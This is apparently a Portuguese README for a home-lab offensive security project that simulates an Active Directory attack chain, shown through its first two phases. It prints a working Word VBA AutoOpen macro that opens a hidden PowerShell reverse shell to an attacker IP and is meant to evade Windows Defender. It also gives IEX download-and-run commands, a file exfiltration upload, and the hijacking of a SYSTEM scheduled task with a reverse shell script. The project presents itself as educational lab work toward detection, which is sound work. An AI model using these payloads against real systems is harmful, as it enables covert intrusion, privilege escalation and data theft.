# Simulação de Cadeia de Ataque - Laboratório de Segurança Ofensiva
<br>
<br>

## Objetivo

Esta parte do projeto é a continuação do projeto anterior [Windows Server AD](https://github.com/MercioRodrigues/Windows-server-AD/blob/main/README.md), no qual foi construído, em laboratório, um ambiente Active Directory. Foram também utilizadas ferramentas que já tinham sido preparadas em outro projeto que realizei anteriormente, o [SOC SOAR Project](https://github.com/MercioRodrigues/SOC-SOAR-Project), nomeadamente o **Wazuh**.  
<br>  
Esta fase tem como objetivo simular uma cadeia de ataque realista em um ambiente de domínio Windows, sem detecção por parte do Windows Defender, explorando diferentes etapas de comprometimento típicas de atacantes reais. A simulação foi conduzida em um laboratório controlado, permitindo, posteriormente, a análise detalhada de cada fase da intrusão.


A cadeia de ataque envolve as seguintes etapas:

1. **Acesso inicial**: comprometimento de uma estação de trabalho através da execução de uma macro maliciosa em um documento do Word.
2. **Escalada de privilégios local**: obtenção de privilégios SYSTEM explorando uma tarefa agendada mal configurada.
3. **Exfiltração de credenciais**: extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM.
4. **Movimentação lateral**: acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.

**Análise pós-ataque**: utilização de ferramentas de monitorização e deteção como **Wazuh** e **Wireshark** para investigar a intrusão e compreender os rastros deixados nos logs do sistema e na rede.

O objetivo final é obter não apenas uma shell no controlador de domínio, mas também documentar detalhadamente os indicadores de comprometimento (IoCs), comportamentos suspeitos e evidências forenses que podem ser usadas por equipes de defesa para deteção precoce e resposta a incidentes.

---

⚠️ *Aviso: Este projeto foi realizado exclusivamente para fins educacionais e em ambiente isolado. Nenhuma das técnicas aqui descritas deve ser utilizada em ambientes reais sem autorização explícita.*


<br>
<br>

## 🧪 Fase 1 - Acesso Inicial via Macro em Documento Word (Phishing)

Nesta fase inicial, o atacante utilizou **engenharia social (phishing)** para induzir um colaborador da organização a abrir um documento Word malicioso. O documento continha uma macro em VBA (Visual Basic for Applications) configurada para executar automaticamente ao abrir o ficheiro.

###  Objetivo

Obter uma **shell reversa PowerShell** no sistema da vítima sem levantar suspeitas, utilizando `Wscript.Shell` para evadir políticas de execução e manter a execução em segundo plano.

---

### 📄 Conteúdo da Macro

A macro maliciosa foi inserida no Editor do Visual Basic para Aplicações, dentro do módulo `NewMacros`. O código é dividido em duas partes:

- `AutoOpen()`: executa a macro automaticamente ao abrir o ficheiro
- `test()`: define e executa o payload PowerShell em modo oculto

```vb
Sub AutoOpen()
    Call test
End Sub

Sub test()
    ' test Macro
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.205',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub
```

<p align="center">
 
  <br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/14196c25-96e6-43dc-b1f4-ce14bd0be6be" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

---

### Listener do Atacante

Enquanto o documento era aberto pela vítima, o atacante encontrava-se à escuta na máquina Kali, utilizando `netcat` com `rlwrap` para suportar histórico e edição de linha:

```bash
rlwrap nc -lvnp 443
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/1d6fd6d7-a226-44c2-a28a-da105117975d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resumo**

O código PowerShell embutido na macro estabelece uma conexão TCP reversa para o endereço do atacante (192.168.1.205) na porta 443. Após a conexão, o script entra num loop que:

**1.** Recebe comandos enviados pelo atacante

**2.** Executa os comandos localmente com Invoke-Expression (iex)

**3.** Envia a saída da execução de volta através do canal TCP

Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.

 <br/>
    <br/>

## 🧪 Fase 2 — Escalada de Privilégios Local

Após o acesso inicial, o próximo objetivo foi escalar privilégios para obter controlo total do sistema como **NT AUTHORITY\SYSTEM**.  
Esta fase consistiu na **descoberta e exploração de uma tarefa agendada mal configurada**, permitindo a execução de código com permissões elevadas.

---

### 1. Preparação do Ambiente de Investigação

Foi criado um servidor de upload/download em Python na máquina atacante para facilitar a transferência de ficheiros entre as máquinas:

```bash
python3 upload_server.py
# [+] Serving HTTP upload/download server at port 8080
```

---

### 2. Execução do WinPEAS e Exfiltração do Output

Na shell da vítima, foi executado o `winPEASps1.ps1`, e a saída foi guardada num ficheiro `.txt`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
```

Em seguida, o ficheiro foi exfiltrado para a máquina do atacante:

```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/d11db3f6-816b-45a4-b7a7-11ef05ae2246" height="60%" width="60%"/>
    <br/>
    <br/>
    <img src="https://github.com/user-attachments/assets/1cd6ede9-e275-484c-9a32-ac27e3fbdcac" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>



---

### 3. Análise do Output do WinPEAS

Na máquina atacante, o output foi segmentado por tarefas agendadas:

```bash
awk '
/^TaskName:/ {
    ++i;
    f = sprintf("task_%03d.txt", i);
}
f { print > f }
' winpeas.txt
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/1dacf129-6f1a-4b05-8fcb-f7febbe8d0bb" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

Depois, filtrou-se por tarefas que correm como `SYSTEM`:

```bash
grep -l "Run As User: *SYSTEM" task_*.txt > SYSTEM_tasks.txt
```

E procuraram-se scripts suspeitos:

```bash
grep -Ei "ps1|bat|cmd|exe" $(cat SYSTEM_tasks.txt) | grep -i "task to run"
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/845d809a-25e0-4a1a-b050-028f2f5db977" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Foi identificado a seguinte tarefa crítica:

```text
task_012.txt:Task To Run: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\TempTask\svc_launcher.ps1
```

Lendo o conteudo de **task_012.txt** conseguimos obter a informação mais completa sobre a tarefa.

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/c523e3eb-39da-4398-b588-4091550ed2bf" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

---

### 4. Verificação de Permissões

Foi verificado que o utilizador comprometido (`jsilva`) tinha permissões de **controlo total** sobre o ficheiro `.ps1` usado pela tarefa:

```powershell
icacls C:\TempTask\svc_launcher.ps1
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/875ef2f9-e9af-465e-b1c8-45014cca5b24" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Saída relevante:

```
PILAO\jsilva:(I)(F)          → Full control — pode sobrescrever este ficheiro
NT AUTHORITY\SYSTEM:(I)(F)   → A tarefa agendada corre o script como SYSTEM
```

---

### 5. Substituição do Script e Execução da Tarefa

Foi feito o upload de um **script malicioso** com reverse shell, substituindo o original:

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.205:8080/svc_launcher.ps1' -OutFile 'C:\TempTask\svc_launcher.ps1'"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/4d36fb25-f3e4-47c3-b7c3-4efe2c2cf370" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a maquina a vitima inicie a máquina mas como tratasse de um laboratório forçou-se o reinício:

```powershell
Restart-Computer -Force
```

---

### 6. Resultado — Shell como SYSTEM

Na máquina atacante, aguardou-se ligação à porta 4444:

```bash
rlwrap nc -lvnp 4444
```

Após o reinício da vítima:

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/448ad18a-e3b8-4bee-b28b-f0d69decd94f" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>




A escalada foi bem-sucedida! O atacante obteve **acesso completo com privilégios SYSTEM**.

---

### Resumo

A má configuração de permissões num script chamado por uma tarefa agendada como SYSTEM foi explorada com sucesso para **escalar privilégios localmente**.

A utilização do `winPEAS` permitiu descobrir a vulnerabilidade, a análise de permissões confirmou a possibilidade de exploração, e a substituição do script permitiu ganhar **controlo total do sistema**, com acesso **persistente**.

